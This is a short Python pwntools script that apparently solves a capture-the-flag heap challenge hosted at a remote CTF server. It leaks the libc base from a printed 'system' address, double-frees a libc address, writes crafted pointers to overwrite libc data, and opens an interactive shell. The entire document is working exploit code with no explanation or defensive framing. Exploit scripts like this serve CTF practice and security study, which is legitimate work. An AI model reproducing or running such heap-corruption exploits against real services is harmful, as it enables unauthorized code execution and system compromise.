from pwn import *

r = remote('uni.hctf.fun', 13371)


def malloc(amount, shell=0):
    r.sendline('1')
    r.recvuntil('How much?\n')
    r.sendline(str(amount))
    if shell:
        return
    r.recvuntil('bye!\n')


def free(pos, r):
    r.sendline('2')
    r.recvuntil('Where?\n')
    r.sendline(str(pos))
    r.recvuntil('bye!\n')


def write(data, shell=0):
    r.sendline('3')
    r.recvuntil('What?\n')
    r.send(data)
    if shell:
        return
    r.recvuntil('bye!\n')


def sploit(libcbase):
    free(libcbase + 0x1c4450, r)
    free(libcbase + 0x1c4450, r)
    malloc(0x80)
    write(struct.pack('<Q', libcbase + 0x1c4000))  # libc base address, used by plt as an offset.
    malloc(0x80)
    malloc(0x80)
    write(struct.pack('<Q', libcbase + 0xc8f70 - 0x3a570), shell=1)  # maybe_script_execute - exit
    r.interactive()


if __name__ == '__main__':
    r.recvuntil('system : ')
    libcbase = int(r.recvline().strip(), 16) - 0x45380
    r.recvuntil('bye!\n')
    sploit(libcbase)
